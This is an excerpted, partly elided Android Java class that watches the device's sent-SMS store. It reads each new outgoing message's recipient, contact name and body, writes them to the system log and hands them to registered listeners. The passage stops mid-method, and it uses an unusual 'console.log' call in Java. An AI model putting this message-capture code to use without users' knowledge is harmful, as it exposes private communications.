...
public class SmsSentObserver extends ContentObserver {
	...
	public SmsSentObserver(Handler handler, Context ctx) {
		...
		mContext = ctx;
		isSend = true;
		console.log("---------SmsSentObserver loaded----------------------------------------------------");
	}
	...
	private static ArrayList<OnOutgoingSmsListener> onOutgoingSmsListenerArrayList = new ArrayList<OnOutgoingSmsListener>();
	
	public static  interface OnOutgoingSmsListener{
	    public void onOutgoingSms(Object...objects);
	}
    public static  void setOnOutgoingSmsListener(OnOutgoingSmsListener listener) {
    	onOutgoingSmsListenerArrayList.add(listener);
    }
	 /*
	  * @param0 String phoneNumber
	  * @param1	String msg	 
	  */
    private static  void reportOnOutgoingSms(Object...objects){
    	for(OnOutgoingSmsListener listener : onOutgoingSmsListenerArrayList){
    		listener.onOutgoingSms(objects);
        }
    }
    //----------------------------------------------------------------------------------------------------------------------------------- 
	...
	public void onChange(boolean selfChange) {
		console.log("---------SmsSentObserver.onChange----------------------------------------------------" + isSend);
		//if (isSend) {
					...
					if (sms_sent_cursor.moveToFirst()) {
						...
						if (protocol == null) {
							...
							if (type == 2) {
								...
								String phoneNumber = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address"));
								Log.i(TAG,"Address : " + phoneNumber);
								
								String body = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body"));
								Log.i(TAG,"Body : "+ body);
								
								String name = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("person"));
								...
								Log.i(TAG,"Body : " + sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")));
								// Log.i(TAG,
								// "Err Code : "
								// + sms_sent_cursor
								// .getString(sms_sent_cursor
								...
								reportOnOutgoingSms(phoneNumber,name, body);
